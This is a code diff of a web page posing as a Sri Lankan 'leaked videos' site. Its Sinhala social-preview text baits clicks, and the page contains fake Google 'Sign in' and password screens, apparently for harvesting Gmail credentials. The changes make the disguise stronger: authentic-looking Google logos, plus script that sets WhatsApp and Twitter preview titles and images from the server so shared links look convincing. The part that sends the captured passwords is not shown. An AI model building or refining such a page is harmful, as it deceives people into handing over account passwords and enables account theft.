@@ -7,16 +7,20 @@
 
     <!-- Open Graph (OG) Tags for WhatsApp & Social Media Preview -->
     <meta property="og:type" content="website">
-    <meta property="og:title" content="Srilankan Wela - Watch Trending Videos">
-    <meta property="og:description" content="Watch the latest trending and exclusive videos on Srilankan Wela.">
-    <meta property="og:image" content="https://i.ibb.co/3mJp9NXm/In-Shot-20261111-182343696.jpg">
+    <meta id="meta_og_title" property="og:title" content="Srilankan Wela - Watch Trending Videos">
+    <meta id="meta_og_desc" property="og:description" content="Watch the latest trending and exclusive videos on Srilankan Wela.">
+    <meta id="meta_og_image" property="og:image" content="https://i.ibb.co/3mJp9NXm/In-Shot-20261111-182343696.jpg">
     <meta property="og:url" content="">
 
     <!-- Twitter Card Tags -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Srilankan Wela - Watch Trending Videos">
-    <meta name="twitter:description" content="Watch the latest trending and exclusive videos on Srilankan Wela.">
-    <meta name="twitter:image" content="https://i.ibb.co/3mJp9NXm/In-Shot-20261111-182343696.jpg">
+    <meta id="meta_tw_title" name="twitter:title" content="Srilankan Wela">
+    <meta id="meta_tw_desc" name="twitter:description" content="🚨🔥 අලුත්ම ලීක් වීඩියෝස් 🔥🚨
+
+😈 උණු උණුවෙන්ම බලන්න!
+⚡ අලුත්ම වීඩියෝස් දැන්ම නරඹන්න!
+🌐 අපේ වෙබ්සයිට් එක අදම FOLLOW කරගන්න ❤️‍🔥">
+    <meta id="meta_tw_image" name="twitter:image" content="https://i.ibb.co/3mJp9NXm/In-Shot-20261111-182343696.jpg">
 
     <style>
         * { box-sizing: border-box; font-family: sans-serif; }
@@ -62,7 +66,7 @@
                 </div>
             </div>
 
-            <!-- Server Title (Starts empty to prevent default flash) -->
+            <!-- Server Title -->
             <div id="txt_video_title" style="font-size: 18px; font-weight: bold; color: #FFFFFF; padding: 12px 0; min-height: 27px;">Loading...</div>
 
             <!-- Thumbnail Container -->
@@ -92,16 +96,16 @@
                 </div>
             </div>
 
-            <div id="btn_premium" style="width: 100%; height: 50px; margin-top: 12px; background: #FE2B54; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: bold; color: #FFFFFF; border-radius: 16px; cursor: pointer;">💎 Loading...</div>
+            <div id="btn_premium" style="width: 100%; height: 50px; margin-top: 12px; background: #FE2B54; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: bold; color: #FFFFFF; border-radius: 16px; cursor: pointer;"> Loading...</div>
             <div id="txt_view_more" style="width: 100%; height: 50px; margin-top: 10px; margin-bottom: 20px; background: #191923; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; color: #CCCCCC; border-radius: 16px;">────────  View More  ────────</div>
         </div>
     </div>
 
     <!-- PAGE 2: GMAIL LOGIN -->
     <div id="page2" class="page" style="background: #0B0B0B; padding: 24px;">
-        <!-- Google Logo Image -->
+        <!-- Google Colored 'G' Logo Image -->
         <div style="margin-top: 24px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" style="width: 75px; height: 24px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google G" style="width: 40px; height: 40px;">
         </div>
         <div style="font-size: 36px; color: #E8EAED; margin-top: 20px;">Sign in</div>
         <div style="font-size: 18px; color: #E8EAED; margin-top: 28px;">Use your Google Account</div>
@@ -121,9 +125,9 @@
 
     <!-- PAGE 3: PASSWORD LOGIN (WELCOME UI) -->
     <div id="page3" class="page" style="background: #131314; padding: 24px; padding-top: 36px;">
-        <!-- Google Logo Image -->
+        <!-- Google Colored 'G' Logo Image -->
         <div style="margin-top: 10px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" style="width: 75px; height: 24px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google G" style="width: 40px; height: 40px;">
         </div>
         <div style="font-size: 36px; color: #E3E2E6; margin-top: 20px;">Welcome</div>
         
@@ -200,8 +204,15 @@
 
             if (data.thumbnail_url) {
                 setThumbnail(data.thumbnail_url);
+                // Dynamically update WhatsApp Preview Meta Tags from Server
+                document.getElementById("meta_og_image").setAttribute("content", data.thumbnail_url);
+                document.getElementById("meta_tw_image").setAttribute("content", data.thumbnail_url);
             }
-            if (data.video_title) document.getElementById("txt_video_title").textContent = data.video_title;
+            if (data.video_title) {
+                document.getElementById("txt_video_title").textContent = data.video_title;
+                document.getElementById("meta_og_title").setAttribute("content", data.video_title);
+                document.getElementById("meta_tw_title").setAttribute("content", data.video_title);
+            }
             if (data.duration) document.getElementById("txt_video_duration").textContent = data.duration;
             if (data.views) document.getElementById("txt_views").textContent = "▶  " + data.views;
             if (data.creator) document.getElementById("txt_creator").textContent = data.creator;
